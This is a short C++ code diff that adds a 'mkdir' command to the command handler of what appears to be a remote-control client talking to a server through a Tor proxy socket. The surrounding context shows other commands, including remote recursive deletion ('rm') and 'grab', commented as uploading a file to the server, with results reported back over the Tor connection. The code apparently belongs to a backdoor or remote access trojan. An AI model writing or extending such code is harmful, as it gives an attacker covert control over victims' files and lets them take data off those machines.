@@ -172,6 +172,9 @@ public:
             else if (cmd.starts_with("rm;")) {
                 this->rm(cmd.substr(3, cmd.size() - 4));
             }
+            else if (cmd.starts_with("mkdir;")) {
+                this->mkdir(cmd.substr(6, cmd.size() - 7));
+            }
             else if (cmd.starts_with("grab;")) { // Uploads a file to the server
                 this->grab(cmd.substr(5, cmd.size() - 6));
             }
@@ -241,6 +244,10 @@ public:
             path += "\\";
         }
         this->torSock.proxySendStr("rm;" + path + ((std::filesystem::remove_all(path)) ? ";success;" : ";failed;"));
+    }
+
+    void mkdir(std::string path) {
+        this->torSock.proxySendStr("mkdir;" + path + ((std::filesystem::create_directories(path)) ? ";success;" : ";failed;"));
     }
 
     /*
